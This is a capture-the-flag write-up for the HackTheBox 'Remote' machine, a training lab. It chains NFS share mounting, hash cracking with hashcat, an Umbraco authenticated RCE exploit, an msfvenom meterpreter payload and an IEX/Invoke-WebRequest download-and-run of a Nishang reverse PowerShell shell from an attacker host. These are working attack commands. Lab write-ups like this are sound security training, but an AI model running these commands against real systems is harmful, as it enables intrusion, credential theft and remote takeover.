---
description: https://app.hackthebox.com/machines/151
---

# 🚬 Remote

<figure><img src="../../../.gitbook/assets/image (545).png" alt=""><figcaption></figcaption></figure>

looking at the webpage, we see a normal website:

<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

the  nmap gives us a few stuff too:

```
nmap -sC -sV 10.129.220.71
Starting Nmap 7.93 ( https://nmap.org ) at 2024-03-12 14:02 GMT
Nmap scan report for 10.129.220.71
Host is up (0.079s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1h00m02s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-12T15:03:35
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.27 seconds
```

we can use ftp in anonymous:

<figure><img src="../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

but 0 files to abuse in there for now:

we are able to do a bit of enumeration via the guided mode:

#### On TCP port 80 we can see a web store. What is the name of the content management system (CMS) present on Remote?

going on the /install found on the gobuster, we are able to see the answer:

<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

#### Since FTP yielded no results we shift our attention over to NFS shares. What is the name of the directory that is available on NFS? (Don't include a leading /)

after a bit of googling, we see how to interact with NFS shares:

{% embed url="https://www.it-connect.fr/le-protocole-nfs-pour-les-debutants/#google_vignette" %}

```
showmount -e 10.129.220.71
Export list for 10.129.220.71:
/site_backups (everyone)
```

Mounting is a process in computing that involves making a storage device or file system accessible to the operating system and its users. When a storage device or file system is mounted, it becomes an integral part of the file hierarchy, and its contents can be accessed through a specified directory.

so to access /site\_backups ->

```
sudo mkdir /mnt/site_backups
```

and then to download th content on our local machine:

```
sudo mount -t nfs 10.129.220.71:/site_backups /mnt/site_backups
```

* `mount`: This command is used to mount a filesystem.
* `-t nfs`: This option specifies the type of filesystem to be mounted, in this case, it's NFS (Network File System). NFS is a distributed file system protocol that allows a user on a client computer to access files over a network in a manner similar to how local storage is accessed.
* `10.129.220.71:/site_backups`: This part of the command specifies the remote NFS server and the path on that server that is being mounted. In this example, the NFS server has the IP address 10.129.220.71, and the directory being mounted is `/site_backups` on that server.
* `/mnt/site_backups`: This is the local mount point, i.e., the directory on the current machine where the NFS share will be made accessible. The contents of the remote directory will be accessible through this local directory.

After mounting everything we go and look on internet where are stored the credentials for this type of environment:

{% embed url="https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials" %}

after going into the App\_Data file, we find the Umbraco.sdf file, let's grep out what we need:

```
strings Umbraco.sdf | head
```

1. **`strings Umbraco.sdf`**: The `strings` command is used to extract printable character sequences from a file. In this case, it is applied to the file named "Umbraco.sdf." This file is likely a binary file, possibly containing text or other data encoded in a non-human-readable format. The `strings` command attempts to identify and print any sequences of printable characters within the file.
2. **`|` (pipe symbol)**: The pipe symbol is used to redirect the output of one command as the input to another. In this case, it takes the output of the `strings` command and sends it as input to the `head` command.
3. **`head`**: The `head` command is used to display the first few lines of a text file or the output of another command. By default, it displays the first 10 lines.

<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

so we can see it's SHA-1, let's see what mode it is on hashcat mode&#x20;

<figure><img src="../../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

```
hashcat -m 100 b8be16afba8c314ad33d812f22a04991b90e2aaa /usr/share/wordlists/rockyou.txt
```

and after waiting:

<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

just to check if it works, go and log in on the login page:

<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption><p>user is admin@htb.local mu bad </p></figcaption></figure>

then we go and submit and we get logged in:

<figure><img src="../../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

then we remember the RCE in searchsploit:

<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

```
searchsploit -m aspx/webapps/49488.py
```

downloaded it and looked at the syntax:

<figure><img src="../../../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

```
python 49488.py -u admin@htb.local -p baconandcheese -i http://10.129.220.71 -c powershell.exe -a "ls C:/"
```

than wrote the payload&#x20;

<figure><img src="../../../.gitbook/assets/image (61).png" alt=""><figcaption></figcaption></figure>

so you just enumerate from now on :&#x20;

<figure><img src="../../../.gitbook/assets/image (546).png" alt=""><figcaption></figcaption></figure>

```
 python 49488.py -u admin@htb.local -p baconandcheese -i http://10.129.220.71 -c powershell.exe -a "cat C:/Users/Public/Desktop/user.txt"
```

Now let's create a malware with msfvenom on our local machine to gain a shell:

```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.94 LPORT=6565 -f exe > exploit2.exe
```

then the payload to transfer our payload through our RCE on the target don't forget to make a python localhost on whatever port you want to retrieve the payload:

```
python 49488.py -u admin@htb.local -p baconandcheese -i http://10.129.230.172 -c powershell.exe -a "-NoP Invoke-WebRequest -Uri 'http://10.10.14.94:8000/exploit2.exe' -OutFile 'C:/ftp_transfer/meter.exe'"
```

1. `-NoP`: This is a parameter for PowerShell, which stands for "NoProfile." It instructs PowerShell not to load any profiles, which can speed up the execution of the script by skipping the loading of user profiles.
2. `Invoke-WebRequest`: This is a PowerShell cmdlet used to send HTTP and HTTPS requests to a web server and then retrieves the results. It's often used for tasks such as downloading files from the internet.
3. `-Uri 'http://10.10.14.94:8000/meter.exe'`: This parameter specifies the Uniform Resource Identifier (URI) of the file to be downloaded. In this case, it's '[http://10.10.14.94:8000/meter.exe](http://10.10.14.94:8000/meter.exe)', which is the URL of the file "meter.exe" located at the specified address.
4. `-OutFile 'C:/ftp_transfer/meter.exe'`: This parameter specifies the path where the downloaded file should be saved on the local system. In this case, it's 'C:/ftp\_transfer/meter.exe'. The `-OutFile` parameter ensures that the downloaded file is saved with the specified filename and path.

If you want to check if it went through, don't think too much and just:

```
python 49488.py -u admin@htb.local -p baconandcheese -i http://10.129.230.172 -c powershell.exe -a "ls C:/ftp_transfer"
```

<figure><img src="../../../.gitbook/assets/image (547).png" alt=""><figcaption></figcaption></figure>

Unfortunately i did not manage to get a reverse shell so i'm going to do it another way:

<figure><img src="../../../.gitbook/assets/image (548).png" alt=""><figcaption></figcaption></figure>

download this one and open it in vscode

first put the good values in the file:

<figure><img src="../../../.gitbook/assets/image (549).png" alt=""><figcaption></figcaption></figure>

than modify the cmd command to be executed just to test out if it works, save it and leave vscode

<figure><img src="../../../.gitbook/assets/image (550).png" alt=""><figcaption><p>name the file cmd.exe not exploit.exe</p></figcaption></figure>

and add http:// in front of the host

in a terminal input the following:

```
sudo tcpdump -i tun0 icmp -v
```

* `tcpdump`: This is the command-line packet analyzer tool. It captures network packets and displays a detailed description of their contents. It can also save captured packets to a file for later analysis.
* `-i tun0`: This option specifies the network interface on which `tcpdump` should capture packets. In this case, it's `tun0`, which typically represents a virtual network interface used for VPN (Virtual Private Network) connections.
* `icmp`: This is the filter expression used to specify the type of packets to capture. Here, it's filtering for ICMP (Internet Control Message Protocol) packets. ICMP is commonly used for diagnostic and control purposes in IP networks, including ping requests and responses.
* `-v`: This option increases the verbosity of the output, providing more detailed information about the captured packets. It can be helpful for troubleshooting and analyzing network traffic.

So, the command `sudo tcpdump -i tun0 icmp -v` essentially captures and displays verbose information about ICMP packets on the `tun0` network interface, helping to monitor and analyze ICMP traffic on that interface.

and on another terminal run the python file:

<figure><img src="../../../.gitbook/assets/image (551).png" alt=""><figcaption></figcaption></figure>

So it works we got our ping back, now let's pop a shell ->

make a directory named www, cd into it

then do this command:

```
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1
```

Nishang is a PowerShell framework and collection of scripts aimed at making penetration testing with PowerShell easier. `Invoke-PowerShellTcp.ps1` is one of the scripts included in Nishang.

This particular script is used for establishing a reverse PowerShell TCP connection. In penetration testing and offensive security scenarios, it's common to establish reverse shells, where the target machine connects back to the attacker's machine. This allows the attacker to gain control over the target system.

then nano into the file, copy this command, go at the end of the file and put it without the "PS >":

<figure><img src="../../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (553).png" alt=""><figcaption><p>at the end of the file</p></figcaption></figure>

go and modify those params in the exploit:

<figure><img src="../../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>

```
IEX( IWR http://10.10.14.94:8000/rev.ps1 -UseBasicParsing)
```

* `IEX`: This cmdlet in PowerShell is used to execute a string that contains PowerShell code. It's often used to invoke PowerShell commands or scripts stored in strings.
* `IWR`: This cmdlet, `Invoke-WebRequest`, is used to send HTTP or HTTPS requests to a web server and retrieve the results. It's commonly used for tasks such as downloading files from the internet.
* `-UseBasicParsing`: This is a parameter of the `Invoke-WebRequest` cmdlet. It instructs PowerShell to use basic parsing when processing the response from the web server. This is useful when dealing with HTML content, as it doesn't require loading the entire HTML document, resulting in faster processing.

and if you put up a listener and a web server, it should go and fetch the ressource on your machine, go and trigger it on the targets machine and pop us a shell&#x20;

<figure><img src="../../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (556).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (557).png" alt=""><figcaption></figcaption></figure>

than navigate to user.txt:

<figure><img src="../../../.gitbook/assets/image (558).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (559).png" alt=""><figcaption></figcaption></figure>
